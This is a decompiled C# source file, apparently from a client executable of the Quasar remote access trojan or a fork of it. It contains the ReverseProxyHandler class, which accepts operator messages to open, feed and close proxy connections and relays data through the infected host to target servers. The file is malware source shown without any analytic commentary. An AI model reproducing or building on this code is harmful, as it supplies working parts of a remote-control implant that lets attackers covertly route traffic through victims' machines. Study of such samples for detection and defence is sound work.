// Decompiled with JetBrains decompiler
// Type: InvokedClient.MessageHandlers.ReverseProxyHandler
// Assembly: Client, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79DD3210-3359-47C5-932E-9352F2CB8134
// Assembly location: C:\Users\ian\Downloads\Telegram Desktop\fein\client.exe

using InvokedClient.Networking;
using InvokedCommon.Messages;
using InvokedCommon.Messages.ReverseProxy;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class ReverseProxyHandler : IMessageProcessor
	{
		private readonly QuasarClient _client;

		public ReverseProxyHandler(QuasarClient client) => this._client = client;

		public bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case ReverseProxyConnect _:
				case ReverseProxyData _:
					return true;
				default:
					return message is ReverseProxyDisconnect;
			}
		}

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case ReverseProxyConnect message1:
					this.Execute(sender, message1);
					break;
				case ReverseProxyData message2:
					this.Execute(sender, message2);
					break;
				case ReverseProxyDisconnect message3:
					this.Execute(sender, message3);
					break;
			}
		}

		private void Execute(ISender client, ReverseProxyConnect message)
		{
			this._client.ConnectReverseProxy(message);
		}

		private void Execute(ISender client, ReverseProxyData message)
		{
			this._client.GetReverseProxyByConnectionId(message.ConnectionId)?.SendToTargetServer(message.Data);
		}

		private void Execute(ISender client, ReverseProxyDisconnect message)
		{
			this._client.GetReverseProxyByConnectionId(message.ConnectionId)?.Disconnect();
		}
	}
}